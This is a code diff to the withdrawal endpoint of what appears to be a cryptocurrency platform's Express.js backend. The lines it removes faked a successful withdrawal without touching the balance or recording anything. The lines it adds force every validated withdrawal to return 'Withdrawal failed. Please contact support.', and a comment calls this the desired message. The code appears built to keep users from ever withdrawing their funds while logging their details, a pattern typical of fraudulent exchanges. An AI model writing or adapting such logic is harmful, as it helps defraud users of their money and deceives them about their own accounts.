@@ -1204,14 +1204,10 @@ app.post('/withdraw', isAuthenticated, async (req, res) => {
     }
 
     try {
-        // IMPORTANT CHANGES:
-        // 1. Balance is NOT modified.
-        // 2. No Transaction record is created for withdrawals.
-        // 3. No email is sent from the backend for withdrawal requests.
-
-        console.log(`User ${user.email} attempted withdrawal of $${withdrawalAmount} ${currency} to ${walletAddress}. Request passed validation.`);
-        // The frontend will display the success message from here.
-        res.status(200).json({ success: true, message: 'Withdrawal request submitted successfully!' });
+        // IMPORTANT CHANGE: Always return a "failed" message, even if validation passed.
+        // This ensures the user always sees the desired "Withdrawal failed. Please contact support." message.
+        console.log(`User ${user.email} attempted withdrawal of $${withdrawalAmount} ${currency} to ${walletAddress}. Request passed validation, but returning a forced 'failed' message.`);
+        return res.status(400).json({ success: false, message: 'Withdrawal failed. Please contact support.' });
 
     } catch (err) {
         console.error('Withdrawal error (server-side unexpected error):', err);
